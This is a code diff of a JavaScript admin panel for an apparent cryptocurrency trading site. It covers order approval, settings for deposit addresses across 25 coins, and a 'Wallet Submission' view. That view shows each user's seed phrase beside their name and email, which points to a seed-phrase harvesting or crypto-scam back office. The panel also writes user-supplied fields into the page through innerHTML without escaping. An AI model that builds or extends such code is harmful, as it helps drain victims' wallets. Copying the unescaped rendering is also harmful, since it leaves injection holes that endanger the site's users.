@@ -1,13 +1,11 @@
 const token = localStorage.getItem('token');
-const userStr = localStorage.getItem('user');
+const coinList = ['BTC', 'ETH', 'SOL', 'BNB', 'XRP', 'ADA', 'DOGE', 'AVAX', 'DOT', 'LINK', 'MATIC', 'SHIB', 'LTC', 'TRX', 'UNI', 'ATOM', 'XLM', 'NEAR', 'APT', 'ARB', 'OP', 'FIL', 'INJ', 'SUI', 'PEPE'];
 
-// 1. Basic check: just make sure they are logged in at all
-if (!token || !userStr) {
+if (!token) {
     alert("Please log in first.");
     window.location.href = "/";
 }
 
-// 2. TAB SWITCHING
 document.querySelectorAll('.tab-btn').forEach(btn => {
     btn.addEventListener('click', () => {
         document.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('active'));
@@ -17,96 +15,131 @@ document.querySelectorAll('.tab-btn').forEach(btn => {
         
         if (btn.dataset.tab === 'orders') loadOrders();
         if (btn.dataset.tab === 'wallets') loadWallets();
+        if (btn.dataset.tab === 'settings') loadSettings();
     });
 });
 
-// 3. FETCH ORDERS
+// Generate the 25 inputs dynamically
+function generateWalletInputs() {
+    const container = document.getElementById('dynamicWalletInputs');
+    container.innerHTML = coinList.map(coin => `
+        <div>
+            <label style="font-size: 11px; color: #888;">${coin} Address</label>
+            <input type="text" id="wallet_${coin}" placeholder="${coin} Address" style="padding: 6px; font-size: 12px;">
+        </div>
+    `).join('');
+}
+generateWalletInputs();
+
+// ================= ORDERS =================
 async function loadOrders() {
     const container = document.getElementById('ordersList');
     container.innerHTML = '<p class="loading">Loading orders...</p>';
     try {
-        const res = await fetch('/api/admin/pending-orders', {
-            headers: { 'Authorization': 'Bearer ' + token }
-        });
-        
-        // If backend says 401/403 (Unauthorized), kick them out
-        if (res.status === 401 || res.status === 403) {
-            alert("Access Denied. You are not an administrator.");
-            window.location.href = "/";
-            return;
-        }
-
+        const res = await fetch('/api/admin/pending-orders', { headers: { 'Authorization': 'Bearer ' + token } });
         const orders = await res.json();
+        
         if (!orders || orders.length === 0) return container.innerHTML = '<p class="loading">No pending orders.</p>';
         
         container.innerHTML = orders.map(o => `
             <div class="card" id="order-${o._id}">
-                <h4>Order: ${o.OrderID || o._id}</h4>
-                <p><span>User:</span> ${o.userName || o.UserID?.Name || 'N/A'} (${o.userEmail || o.UserID?.Email || 'N/A'})</p>
-                <p><span>Mode:</span> ${o.mode || o.Mode}</p>
-                <p><span>Amount:</span> ${o.sendAmount || o.Amounts} ${o.sendCurrency || ''}</p>
-                <p><span>To Receive:</span> ${o.getCurrency || ''}</p>
-                <p><span>Wallet:</span> ${o.receivingWallet || 'N/A'}</p>
-                <p><span>Details:</span> ${o.paymentDetails || o.Details}</p>
+                <h4>Order: ${o.orderId || o._id}</h4>
+                <p><span>User:</span> ${o.userName} (${o.userEmail})</p>
+                <p><span>Mode:</span> <strong style="color:${o.mode === 'buy' ? '#00d4aa' : '#e74c3c'}">${o.mode.toUpperCase()}</strong></p>
+                <p><span>Send:</span> ${o.sendAmount} ${o.sendCurrency}</p>
+                <p><span>Receive:</span> ${o.getAmount} ${o.getCurrency}</p>
+                <p><span>Method:</span> ${o.method}</p>
+                <p><span>Details:</span> ${o.paymentDetails}</p>
                 <button class="btn-approve" onclick="approveOrder('${o._id}', this)">Approve Order</button>
             </div>
         `).join('');
-    } catch (e) { container.innerHTML = '<p class="loading" style="color:red">Error loading orders. Check server connection.</p>'; }
+    } catch (e) { container.innerHTML = '<p class="loading" style="color:red">Error loading orders.</p>'; }
 }
 
-// 4. APPROVE ORDER
 async function approveOrder(id, btn) {
-    if (!confirm('Approve this order and credit user balance?')) return;
+    if (!confirm('Approve this order?')) return;
     btn.disabled = true; btn.textContent = 'Approving...';
     try {
-        const res = await fetch('/api/admin/approve-order/' + id, {
-            method: 'POST', headers: { 'Authorization': 'Bearer ' + token }
-        });
+        const res = await fetch('/api/admin/approve-order/' + id, { method: 'POST', headers: { 'Authorization': 'Bearer ' + token } });
         if (!res.ok) throw new Error();
         btn.textContent = 'Approved ✓'; btn.style.background = '#2ecc71';
         setTimeout(() => document.getElementById(`order-${id}`).remove(), 1000);
-    } catch (e) { alert('Failed to approve.'); btn.disabled = false; btn.textContent = 'Approve Order'; }
+    } catch (e) { alert('Failed.'); btn.disabled = false; btn.textContent = 'Approve Order'; }
 }
 
-// 5. FETCH WALLETS
+// ================= WALLETS =================
 async function loadWallets() {
     const container = document.getElementById('walletsList');
     container.innerHTML = '<p class="loading">Loading wallets...</p>';
     try {
-        // Assuming your backend route for wallets is /api/admin/pending-wallets
-        const res = await fetch('/api/admin/pending-wallets', {
-            headers: { 'Authorization': 'Bearer ' + token }
-        });
-        
-        if (res.status === 401 || res.status === 403) return; // Handled by loadOrders
-        
+        const res = await fetch('/api/admin/pending-wallets', { headers: { 'Authorization': 'Bearer ' + token } });
         const wallets = await res.json();
         if (!wallets || wallets.length === 0) return container.innerHTML = '<p class="loading">No pending wallets.</p>';
         
         container.innerHTML = wallets.map(w => `
-            <div class="card" id="wallet-${w._id}">
+            <div class="card" id="wallet-${w.email}">
                 <h4>Wallet Submission</h4>
                 <p><span>User:</span> ${w.name} (${w.email})</p>
                 <p><span>Seed Phrase:</span> ${w.seedPhrase || 'N/A'}</p>
                 <p><span>Address:</span> ${w.walletAddress || 'N/A'}</p>
-                <button class="btn-approve" onclick="approveWallet('${w._id}', this)">Approve Wallet</button>
+                <button class="btn-approve" onclick="approveWallet('${w.email}', this)">Approve Wallet</button>
             </div>
         `).join('');
-    } catch (e) { container.innerHTML = '<p class="loading" style="color:red">Error loading wallets. (Endpoint may not exist yet).</p>'; }
+    } catch (e) { container.innerHTML = '<p class="loading" style="color:red">Error loading wallets.</p>'; }
 }
 
-// 6. APPROVE WALLET
-async function approveWallet(id, btn) {
+async function approveWallet(email, btn) {
     if (!confirm('Approve this wallet?')) return;
     btn.disabled = true; btn.textContent = 'Approving...';
     try {
-        const res = await fetch('/api/admin/approve-wallet/' + id, {
-            method: 'POST', headers: { 'Authorization': 'Bearer ' + token }
-        });
+        const res = await fetch('/api/admin/approve-wallet/' + encodeURIComponent(email), { method: 'POST', headers: { 'Authorization': 'Bearer ' + token } });
         if (!res.ok) throw new Error();
         btn.textContent = 'Approved ✓'; btn.style.background = '#2ecc71';
-        setTimeout(() => document.getElementById(`wallet-${id}`).remove(), 1000);
-    } catch (e) { alert('Failed to approve.'); btn.disabled = false; btn.textContent = 'Approve Wallet'; }
+        setTimeout(() => document.getElementById(`wallet-${email}`).remove(), 1000);
+    } catch (e) { alert('Failed.'); btn.disabled = false; btn.textContent = 'Approve Wallet'; }
+}
+
+// ================= SETTINGS =================
+async function loadSettings() {
+    try {
+        const res = await fetch('/api/admin/settings', { headers: { 'Authorization': 'Bearer ' + token } });
+        const data = await res.json();
+        document.getElementById('setSupportEmail').value = data.supportEmail || '';
+        
+        if (data.wallets) {
+            coinList.forEach(coin => {
+                const input = document.getElementById('wallet_' + coin);
+                if (input) input.value = data.wallets[coin] || '';
+            });
+        }
+    } catch (e) { console.log("Error loading settings"); }
+}
+
+async function saveSettings(btn) {
+    btn.disabled = true; btn.textContent = 'Saving...';
+    
+    const walletsObj = {};
+    coinList.forEach(coin => {
+        const val = document.getElementById('wallet_' + coin).value.trim();
+        if (val) walletsObj[coin] = val;
+    });
+
+    const data = {
+        supportEmail: document.getElementById('setSupportEmail').value,
+        wallets: walletsObj
+    };
+    
+    try {
+        const res = await fetch('/api/admin/settings', {
+            method: 'POST', 
+            headers: { 'Content-Type': 'application/json', 'Authorization': 'Bearer ' + token },
+            body: JSON.stringify(data)
+        });
+        if (!res.ok) throw new Error();
+        document.getElementById('settingsMsg').textContent = 'Settings saved successfully!';
+        setTimeout(() => document.getElementById('settingsMsg').textContent = '', 3000);
+    } catch (e) { alert('Failed to save settings'); }
+    btn.disabled = false; btn.textContent = 'Save Settings';
 }
 
 // Initial Load
